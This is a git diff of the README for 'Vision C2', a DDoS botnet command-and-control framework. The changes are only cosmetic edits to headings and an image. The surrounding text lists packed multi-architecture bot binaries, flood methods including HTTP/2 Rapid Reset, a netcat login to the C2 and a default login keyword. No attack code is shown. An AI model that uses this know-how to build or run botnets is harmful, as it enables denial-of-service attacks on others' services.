@@ -12,15 +12,14 @@
 [![Architecture](https://img.shields.io/badge/Full_Architecture-Documentation-blueviolet?style=for-the-badge)](Docs/ARCHITECTURE.md)
 [![Changelog](https://img.shields.io/badge/Full_ChangeLog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)
 
-![Vision C2](vision-banner.svg)
+![Animation](https://github.com/user-attachments/assets/bab596ce-5269-42ca-ae97-cae26437ae41)
 ---
 
 <br>
 </div>
 
 
-
-## ✨ Key Features
+##  Key Features
 
 | Category              | Feature                                                                 |
 |-----------------------|-------------------------------------------------------------------------|
@@ -34,7 +33,7 @@
 |  Cross-Platform     | Multi-architecture bot binaries (14 targets out-of-the-box/ Custom UPX Packer included)             |
 |  Auto-Setup         | Interactive Python Script to automate Config Setup and Build (updates source code)              |
 
-## ⚔️ Attack Methods
+##  Attack Methods
 
 ### Layer 4 (Network / Transport Layer)
 
@@ -57,9 +56,8 @@
 | Rapid Reset     | HTTP/2 CVE-2023-44487 — batched HEADERS+RST_STREAM framing  |
 | Proxy Support   | Full proxy list integration for all L7 methods (HTTP/SOCKS5) |
 
-![Animation](https://github.com/user-attachments/assets/bab596ce-5269-42ca-ae97-cae26437ae41)
 
-## 🚀 Installation
+##  Installation
 
 ### Prerequisites
 ```bash
@@ -91,7 +89,7 @@ sudo apt update && sudo apt install -y \
    - Agent Binaries: `./bins/`
    - Configuration: `setup_config.txt`
 
-## 🖥️ Usage
+##  Usage
 
 ### Starting the C2 Server
 **Option 1: TUI Mode (Recommended)**
@@ -109,7 +107,7 @@ nc your-server-ip 1337
 - User database: `cnc/users.json`
 - Default login keyword: `spamtec`
 
-## 🏗️ Architecture
+##  Architecture
 
 ```text
 Agent Startup Sequence
@@ -133,12 +131,12 @@ Agent Startup Sequence
    └─ Encrypted bidirectional communication
 ```
 
-## 📖 Documentation
+##  Documentation
 - **Changelog**: [`Docs/CHANGELOG.md`](Docs/CHANGELOG.md)
 - **Commands**: [`Docs/COMMANDS.md`](Docs/COMMANDS.md)
 - **Usage**: [`Docs/USAGE.md`](Docs/USAGE.md)
 
-## ⚠️ Legal Disclaimer
+## Legal Disclaimer
 
 **FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY**
 
@@ -149,7 +147,7 @@ This software is intended for:
 
 **Usage of this tool for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.**
 
-## 👤 Author
+##  Author
 
 **Syn**
 - GitHub: [@syn2much](https://github.com/syn2much)
